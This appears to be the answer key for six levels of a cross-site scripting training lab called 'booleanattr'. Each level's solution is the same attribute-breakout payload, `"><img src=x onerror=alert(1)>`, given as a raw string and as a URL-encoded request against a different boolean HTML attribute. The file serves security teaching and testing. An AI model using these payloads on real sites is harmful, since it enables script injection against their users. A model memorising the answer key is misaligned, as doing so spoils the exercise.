# booleanattr — solutions

Reflection inside double-quoted boolean attribute values; break out and inject a tag.

### booleanattr-level1

`/booleanattr/level1/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: <input checked="…">

### booleanattr-level2

`/booleanattr/level2/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: <select multiple="…">

### booleanattr-level3

`/booleanattr/level3/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: <input readonly="…">

### booleanattr-level4

`/booleanattr/level4/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: <button disabled="…">

### booleanattr-level5

`/booleanattr/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: <details open="…">

### booleanattr-level6

`/booleanattr/level6/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: <input autofocus="…">
